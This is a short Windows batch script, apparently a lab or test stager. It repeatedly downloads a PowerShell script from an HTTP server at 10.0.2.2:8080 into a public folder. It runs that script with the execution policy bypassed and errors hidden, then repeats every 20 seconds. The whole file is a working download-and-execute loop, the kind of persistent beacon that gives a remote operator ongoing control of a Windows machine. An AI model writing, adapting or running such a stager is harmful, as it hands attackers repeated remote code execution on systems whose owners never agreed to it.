@echo off
set d=C:\Users\Public\p37
cd /d %d%
:top
powershell -NoProfile -c "(New-Object Net.WebClient).DownloadFile('http://10.0.2.2:8080/cur.ps1','%d%\cur.ps1')" 2>nul
powershell -NoProfile -ExecutionPolicy Bypass -File %d%\cur.ps1
timeout /t 20 /nobreak >nul
goto top
